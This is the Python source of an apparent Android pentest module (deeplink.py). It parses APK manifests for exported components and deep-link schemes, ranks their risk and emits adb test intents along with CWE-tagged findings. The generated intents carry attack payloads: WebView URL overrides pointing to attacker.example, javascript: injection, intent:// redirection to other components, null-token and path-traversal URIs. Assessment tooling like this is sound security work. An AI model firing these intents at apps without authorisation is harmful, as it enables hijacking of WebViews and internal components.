"""
Pentest Toolkit v3.3 — Deep-link & exported-component sniper (deeplink.py)

Extends mobile.py (APK static analysis) with the deep-link / intent
attack surface: exported components, custom URI schemes and fuzzed
test intents. Same evidence standard as the rest of the toolkit:
verified fact = confirmed, strong indication = probable, suspicious
pattern = candidate (never rounded up).

Manifest source strategy (documented limits):
1. androguard (the same parser mobile.py uses) — full binary AXML
   decode for real APKs. Used when the library is importable.
2. Plaintext XML AndroidManifest.xml — some APK-like archives (test
   fixtures, repacked/processed bundles) ship the manifest as text.
3. Byte-regex fallback over binary AXML — extract scheme/host/string
   attributes without a full AXML decode. LIMIT: this cannot reliably
   recover component structure (names/flags), so the fallback only
   contributes schemes and the component list stays empty; the scan
   reports parse_limits so the operator knows coverage is reduced.
"""
import os
import re
import sys
import zipfile
from urllib.parse import quote

if __package__ in (None, ""):
    # Script-mode execution (python offensive/deeplink.py): the project
    # root must be importable for the vulnscan2 dependency below.
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from defusedxml import ElementTree as ET
except Exception:  # pragma: no cover - fallback parity with mobile.py
    from xml.etree import ElementTree as ET

from vulnscan2 import F

NS = "{http://schemas.android.com/apk/res/android}"
MANIFEST = "AndroidManifest.xml"

# Common WebView URL-override query keys seen in the wild.
_WEBVIEW_URL_KEYS = ("url", "loadUrl", "webviewUrl", "webview_url",
                     "target", "link", "redirect", "goto")


# ------------------------------------------------------------- manifest read

def _manifest_bytes(zf):
    try:
        return zf.read(MANIFEST)
    except KeyError:
        return None


def _manifest_via_androguard(zf, data):
    """Best-effort: reuse mobile.py's AXML handling via androguard."""
    try:
        from androguard.core.axml import AXMLPrinter
        xml = AXMLPrinter(data).get_buff().decode("utf-8", "replace")
        return ET.fromstring(xml)
    except Exception:
        return None


def _attr(el, name):
    """android-namespace attribute getter tolerant of both the expanded
    {uri}name form and a literal android:name form."""
    v = el.get(NS + name)
    if v is not None:
        return v
    v = el.get("android:" + name)
    if v is not None:
        return v
    for k, val in el.attrib.items():
        if k.endswith("}" + name) or k.endswith(":" + name):
            return val
    return el.get(name)


_BINARY_SCHEME_RE = re.compile(rb"[\x20-\x7e]{3,40}")


def _schemes_from_binary(data):
    """Fallback scheme harvest from binary AXML: string-pool scan for
    short lowercase tokens that look like custom schemes. Heuristic —
    reported under parse_limits so reduced coverage is never hidden."""
    found = set()
    for m in _BINARY_SCHEME_RE.findall(data):
        s = m.decode("utf-8", "replace").strip().lower()
        if re.fullmatch(r"[a-z][a-z0-9+.-]{1,20}", s) and \
                s not in ("true", "false", "name", "utf-8", "manifest",
                          "application", "activity", "service", "receiver",
                          "provider", "intent", "action", "category", "data"):
            found.add(s)
    return sorted(found)


def _parse_manifest(zf):
    """-> (root_or_None, schemes_fallback, limits_note)."""
    data = _manifest_bytes(zf)
    if data is None:
        return None, [], "AndroidManifest.xml missing from archive"
    if data[:1] in (b"<", b"\xef"):  # plaintext (optionally with BOM)
        try:
            return ET.fromstring(data.decode("utf-8-sig", "replace")), [], ""
        except Exception as e:
            return None, [], f"plaintext manifest failed to parse: {e}"
    root = _manifest_via_androguard(zf, data)
    if root is not None:
        return root, [], ""
    return None, _schemes_from_binary(data), \
        "binary AXML could not be decoded (no androguard): scheme pool " \
        "recovered heuristically, component structure unavailable"


# ------------------------------------------------------------- surface parse

def _intent_filters(el):
    filters = []
    for f in el.findall("intent-filter"):
        actions = [_a.get("name") or _a.get(NS + "name") or ""
                   for _a in f.findall("action")]
        cats = [_c.get("name") or _c.get(NS + "name") or ""
                for _c in f.findall("category")]
        schemes, hosts, path_prefixes = [], [], []
        for d in f.findall("data"):
            for getter, bucket in ((_attr(d, "scheme"), schemes),
                                   (_attr(d, "host"), hosts),
                                   (_attr(d, "pathPrefix"), path_prefixes)):
                v = getter
                if v and v not in bucket:
                    bucket.append(v)
        links = []
        for s in schemes:
            for h in (hosts or [""]):
                links.append({"scheme": s, "host": h,
                              "pathPrefixes": path_prefixes})
        filters.append({"actions": actions, "categories": cats,
                        "links": links,
                        "autoVerify": (_attr(f, "autoVerify") == "true")})
    return filters


def parse_apk_surface(apk_path):
    """Extract the exported-component / deep-link attack surface from an
    APK (zip). Returns a surface dict: package, components (with
    exported status, permission guard, intent filters, deep links),
    custom schemes and parse_limits. Exported default rules per Android:
    a component with an intent-filter defaults to exported (pre-31) and
    exported is judged from the explicit attribute when present."""
    out = {"package": "", "components": [], "schemes": [],
           "deeplinks": [], "parse_limits": ""}
    zf = zipfile.ZipFile(apk_path)
    try:
        root, fallback_schemes, limits = _parse_manifest(zf)
        out["parse_limits"] = limits
        for s in fallback_schemes:
            if s not in out["schemes"]:
                out["schemes"].append(s)
        if root is None:
            return out
        pkg = _attr(root, "package") or ""
        out["package"] = pkg
        app = root.find("application")
        if app is None:
            return out
        for tag in ("activity", "activity-alias", "service", "receiver"):
            for el in app.findall(tag):
                name = _attr(el, "name") or ""
                if pkg and name.startswith("."):
                    name = pkg + name
                elif pkg and name and "." not in name:
                    name = pkg + "." + name
                exported_attr = _attr(el, "exported")
                filters = _intent_filters(el)
                has_filter = bool(filters)
                if exported_attr is not None:
                    exported = exported_attr == "true"
                else:
                    exported = has_filter  # pre-targetSdk-31 default
                permission = _attr(el, "permission")
                deeplinks = []
                for f in filters:
                    for link in f["links"]:
                        deeplinks.append(link)
                        if link["scheme"] and link["scheme"] \
                                not in out["schemes"]:
                            out["schemes"].append(link["scheme"])
                        uri = link["scheme"] + "://" + link["host"] \
                            if link["host"] else link["scheme"] + "://"
                        if uri not in out["deeplinks"]:
                            out["deeplinks"].append(uri)
                out["components"].append({
                    "tag": tag, "name": name, "exported": exported,
                    "permission": permission, "intent_filter": has_filter,
                    "filters": filters, "deeplinks": deeplinks})
    finally:
        zf.close()
    return out


# ------------------------------------------------------------- risk ranking

def exported_risk_rank(exported, permission, intent_filter):
    """Heuristic risk rank for one exported component:
    'high'   — exported, no guard permission, and intent filters that
               handle an external scheme (any app can fire an intent at it);
    'medium' — exported and reachable via intent-filter but carries a
               permission guard, or exported without a filter;
    'low'    — not exported.
    Note: a normal/dangerous permission guard is weak (any app can be
    granted it) but reduces opportunistic reach — hence medium, not high."""
    if not exported:
        return "low"
    guarded = bool(permission)
    if intent_filter and not guarded:
        return "high"
    return "medium"


# ------------------------------------------------------------- fuzzing

def deeplink_fuzz(surface):
    """Emit manual test intent URIs for every scheme/host in the surface.
    NEVER executed by the scanner — every entry carries the adb command a
    human tester runs (adb shell am start -a android.intent.action.VIEW -d
    ...) in a manual_check-style plan. Attacks:
      - webView url override (?url= / ?loadUrl= / ?webviewUrl= / ...),
      - javascript:// URI injection into the same override keys,
      - intent redirection (nested intent:// toward other exported comps),
      - null / path-traversal parameters."""
    cases = []
    pkg = surface.get("package", "")
    for comp in surface.get("components", []):
        if not comp.get("exported"):
            continue
        for link in comp.get("deeplinks", []):
            scheme, host = link["scheme"], link["host"]
            if not scheme:
                continue
            base = f"{scheme}://{host}" if host else f"{scheme}://"

            def case(kind, uri, note):
                adb = (f'adb shell am start -a android.intent.action.VIEW '
                       f'-d "{uri}"' + (f" {pkg}" if pkg else ""))
                cases.append({"component": comp["name"], "kind": kind,
                              "uri": uri, "adb": adb, "note": note})

            for key in _WEBVIEW_URL_KEYS:
                case("webView-url-override",
                     f"{base}/page?{key}=https://attacker.example/",
                     "URL-override key may load attacker content in a WebView")
                case("javascript-injection",
                     f"{base}/page?{key}=javascript:alert(1)",
                     "javascript: URI may execute in the app's WebView")
            case("intent-redirection",
                 "intent://attacker.example/#Intent;scheme=https;"
                 "action=android.intent.action.VIEW;end",
                 "nested intent:// URI may be re-dispatched to another "
                 "exported component (intent redirection)")
            if pkg:
                # aim the redirect at another exported component of this app
                others = [c["name"] for c in surface.get("components", [])
                          if c.get("exported") and c["name"] != comp["name"]]
                if others:
                    case("intent-redirection-component",
                         f"intent://x/#Intent;component={pkg}/{others[0]};end",
                         "explicit-component intent may reach an internal "
                         "exported component directly")
            case("null-param", f"{base}/page?token=(null)",
                 "null token may bypass an authenticity check")
            case("path-traversal", f"{base}/page/../../private/data",
                 "path traversal may escape the handler's route prefix")
    return cases


def _manual_plan(cases):
    """manual_check-style plan: ordered human steps, never executed."""
    steps = []
    for i, c in enumerate(cases[:12], 1):
        steps.append({"step": i, "kind": c["kind"], "uri": c["uri"],
                      "command": c["adb"], "expected_observation": c["note"]})
    return {"title": "Deep-link / exported-component manual test plan",
            "tool": "adb (run on a test device)",
            "steps": steps}


# ------------------------------------------------------------- findings

def _findings(surface, cases):
    findings = []
    for comp in surface.get("components", []):
        handles_external_scheme = any(
            link["scheme"] not in ("android", "package", "content", "file")
            for link in comp.get("deeplinks", []))
        rank = exported_risk_rank(comp["exported"], comp.get("permission"),
                                  comp.get("intent_filter"))
        if comp["exported"] and handles_external_scheme and \
                not comp.get("permission"):
            findings.append(F(
                "HIGH",
                "Exported component handles external scheme without permission",
                "An exported component accepts an external URI scheme "
                "(any app on the device can fire an intent at it) and has "
                "no permission guard. Static-analysis verification "
                "(manifest structure); the dynamic behaviour of the "
                "handler is manual-required — run the adb test plan.",
                evidence=f"{comp['tag']} {comp['name']} exported=true, "
                         f"no permission, schemes: "
                         + ", ".join(sorted({l["scheme"] for l in
                                             comp["deeplinks"]}))[:200],
                cwe="CWE-927", owasp="MASVS-PLATFORM", cvss=7.5,
                remed="Set exported=false for internal components or "
                      "protect them with a signature-level permission; "
                      "validate deep-link parameters before use.",
                confidence="probable", location=comp["name"],
                param=comp["name"]))
        elif rank == "medium" and not comp.get("permission"):
            findings.append(F(
                "MEDIUM",
                "Exported component without permission guard",
                "An exported component has no permission guard and is "
                "reachable by other apps (no external scheme declared). "
                "Static-analysis verification; manual-required for the "
                "intent test.",
                evidence=f"{comp['tag']} {comp['name']} exported=true, "
                         "no permission, no external scheme",
                cwe="CWE-926", owasp="MASVS-PLATFORM", cvss=5.3,
                remed="Set exported=false or add a signature-level guard.",
                confidence="probable", location=comp["name"],
                param=comp["name"]))
    # scheme-level note when fuzz cases exist
    if cases:
        schemes = sorted({s for s in surface.get("schemes", []) if s})
        if schemes:
            findings.append(F(
                "INFO",
                "Fuzzable deep-link surface collected (manual plan attached)",
                "Custom URI schemes and exported components were collected "
                "from the manifest. The attached manual_check plan lists adb "
                "commands for a human tester; the scanner never executes "
                "them.",
                evidence="schemes: " + ", ".join(schemes[:12]),
                cwe="CWE-927", owasp="MASVS-PLATFORM", cvss=0.0,
                remed="Run the manual plan on a test device and review "
                      "WebView/intent handling in the targeted components.",
                confidence="candidate", location=MANIFEST,
                param=",".join(schemes[:6])))
    return findings


# ------------------------------------------------------------- entry point

def analyze_deeplinks(apk_path):
    """CLI entry: analyze one APK -> (findings, surface, plan)."""
    surface = parse_apk_surface(apk_path)
    cases = deeplink_fuzz(surface)
    findings = _findings(surface, cases)
    if findings:
        findings[0]["manual_check"] = _manual_plan(cases)
    return findings, surface, _manual_plan(cases)


def main(argv=None):
    """Standalone CLI: python deeplink.py app.apk — prints findings JSON."""
    import json
    import sys
    args = sys.argv[1:] if argv is None else argv
    if not args:
        print("usage: deeplink.py <apk>", file=sys.stderr)
        return 2
    findings, surface, plan = analyze_deeplinks(args[0])
    print(json.dumps({"findings": findings, "surface": surface,
                      "manual_plan": plan}, indent=2, default=str))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
